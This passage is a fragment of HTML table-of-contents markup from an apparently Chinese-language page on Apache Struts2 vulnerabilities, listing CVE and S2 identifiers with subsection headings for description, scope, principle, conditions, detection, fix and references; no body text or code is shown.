href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-4"><span class="toc-nav-number">5.5.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4"><span class="toc-nav-number">5.5.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-4"><span class="toc-nav-number">5.5.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-4"><span class="toc-nav-number">5.5.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-4"><span class="toc-nav-number">5.5.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-4"><span class="toc-nav-number">5.5.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2011-1772"><span class="toc-nav-number">5.6.</span> <span class="toc-nav-text">CVE-2011-1772</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-5"><span class="toc-nav-number">5.6.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-5"><span class="toc-nav-number">5.6.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-5"><span class="toc-nav-number">5.6.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-5"><span class="toc-nav-number">5.6.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-5"><span class="toc-nav-number">5.6.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-5"><span class="toc-nav-number">5.6.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-5"><span class="toc-nav-number">5.6.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2012-0838"><span class="toc-nav-number">5.7.</span> <span class="toc-nav-text">CVE-2012-0838</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-6"><span class="toc-nav-number">5.7.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-6"><span class="toc-nav-number">5.7.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-6"><span class="toc-nav-number">5.7.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-6"><span class="toc-nav-number">5.7.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-6"><span class="toc-nav-number">5.7.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-6"><span class="toc-nav-number">5.7.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-6"><span class="toc-nav-number">5.7.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#S2-008"><span class="toc-nav-number">5.8.</span> <span class="toc-nav-text">S2-008</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-7"><span class="toc-nav-number">5.8.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-7"><span class="toc-nav-number">5.8.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-7"><span class="toc-nav-number">5.8.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-7"><span class="toc-nav-number">5.8.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-7"><span class="toc-nav-number">5.8.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-7"><span class="toc-nav-number">5.8.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-7"><span class="toc-nav-number">5.8.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2011-3923"><span class="toc-nav-number">5.9.</span> <span class="toc-nav-text">CVE-2011-3923</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-8"><span class="toc-nav-number">5.9.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-8"><span class="toc-nav-number">5.9.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-8"><span class="toc-nav-number">5.9.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-8"><span class="toc-nav-number">5.9.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-8"><span class="toc-nav-number">5.9.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-8"><span class="toc-nav-number">5.9.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-8"><span class="toc-nav-number">5.9.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2012-4386"><span class="toc-nav-number">5.10.</span> <span class="toc-nav-text">CVE-2012-4386</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-9"><span class="toc-nav-number">5.10.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-9"><span class="toc-nav-number">5.10.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-9"><span class="toc-nav-number">5.10.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-9"><span class="toc-nav-number">5.10.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-9"><span class="toc-nav-number">5.10.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-9"><span class="toc-nav-number">5.10.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-9"><span class="toc-nav-number">5.10.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2012-4387"><span class="toc-nav-number">5.11.</span> <span class="toc-nav-text">CVE-2012-4387</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-10"><span class="toc-nav-number">5.11.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-10"><span class="toc-nav-number">5.11.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-10"><span class="toc-nav-number">5.11.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-10"><span class="toc-nav-number">5.11.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-10"><span class="toc-nav-number">5.11.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-10"><span class="toc-nav-number">5.11.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-10"><span class="toc-nav-number">5.11.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2013-1965"><span class="toc-nav-number">5.12.</span> <span class="toc-nav-text">CVE-2013-1965</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-11"><span class="toc-nav-number">5.12.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-11"><span class="toc-nav-number">5.12.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-11"><span class="toc-nav-number">5.12.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-11"><span class="toc-nav-number">5.12.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-11"><span class="toc-nav-number">5.12.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-11"><span class="toc-nav-number">5.12.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-11"><span class="toc-nav-number">5.12.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2013-1966"><span class="toc-nav-number">5.13.</span> <span class="toc-nav-text">CVE-2013-1966</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-12"><span class="toc-nav-number">5.13.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-12"><span class="toc-nav-number">5.13.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-12"><span class="toc-nav-number">5.13.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-12"><span class="toc-nav-number">5.13.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-12"><span class="toc-nav-number">5.13.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-12"><span class="toc-nav-number">5.13.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-12"><span class="toc-nav-number">5.13.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2013-2115"><span class="toc-nav-number">5.14.</span> <span class="toc-nav-text">CVE-2013-2115</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-13"><span class="toc-nav-number">5.14.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-13"><span class="toc-nav-number">5.14.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-13"><span class="toc-nav-number">5.14.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-13"><span class="toc-nav-number">5.14.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-13"><span class="toc-nav-number">5.14.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-13"><span class="toc-nav-number">5.14.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-13"><span class="toc-nav-number">5.14.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2013-2135"><span class="toc-nav-number">5.15.</span> <span class="toc-nav-text">CVE-2013-2135</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-14"><span class="toc-nav-number">5.15.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-14"><span class="toc-nav-number">5.15.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-14"><span class="toc-nav-number">5.15.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-14"><span class="toc-nav-number">5.15.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-14"><span class="toc-nav-number">5.15.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-14"><span class="toc-nav-number">5.15.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-14"><span class="toc-nav-number">5.15.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2013-2251"><span class="toc-nav-number">5.16.</span> <span class="toc-nav-text">CVE-2013-2251</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-15"><span class="toc-nav-number">5.16.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-15"><span class="toc-nav-number">5.16.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-15"><span class="toc-nav-number">5.16.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-15"><span class="toc-nav-number">5.16.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-15"><span class="toc-nav-number">5.16.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-15"><span class="toc-nav-number">5.16.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-15"><span class="toc-nav-number">5.16.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2013-2248"><span class="toc-nav-number">5.17.</span> <span class="toc-nav-text">CVE-2013-2248</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-16"><span class="toc-nav-number">5.17.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-16"><span class="toc-nav-number">5.17.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-16"><span class="toc-nav-number">5.17.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-16"><span class="toc-nav-number">5.17.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-16"><span class="toc-nav-number">5.17.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-16"><span class="toc-nav-number">5.17.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-16"><span class="toc-nav-number">5.17.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2013-4310"><span class="toc-nav-number">5.18.</span> <span class="toc-nav-text">CVE-2013-4310</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-17"><span class="toc-nav-number">5.18.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-17"><span class="toc-nav-number">5.18.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-17"><span class="toc-nav-number">5.18.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-17"><span class="toc-nav-number">5.18.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-17"><span class="toc-nav-number">5.18.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-17"><span class="toc-nav-number">5.18.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-17"><span class="toc-nav-number">5.18.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2013-4316"><span class="toc-nav-number">5.19.</span> <span class="toc-nav-text">CVE-2013-4316</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-18"><span class="toc-nav-number">5.19.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-18"><span class="toc-nav-number">5.19.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-18"><span class="toc-nav-number">5.19.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-18"><span class="toc-nav-number">5.19.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-18"><span class="toc-nav-number">5.19.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-18"><span class="toc-nav-number">5.19.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-18"><span class="toc-nav-number">5.19.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#S2-020"><span class="toc-nav-number">5.20.</span> <span class="toc-nav-text">S2-020</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-19"><span class="toc-nav-number">5.20.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-19"><span class="toc-nav-number">5.20.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-19"><span class="toc-nav-number">5.20.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-19"><span class="toc-nav-number">5.20.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-19"><span class="toc-nav-number">5.20.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-19"><span class="toc-nav-number">5.20.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-19"><span class="toc-nav-number">5.20.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2016-0785"><span class="toc-nav-number">5.21.</span> <span class="toc-nav-text">CVE-2016-0785</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-20"><span class="toc-nav-number">5.21.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-20"><span class="toc-nav-number">5.21.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-20"><span class="toc-nav-number">5.21.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-20"><span class="toc-nav-number">5.21.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" 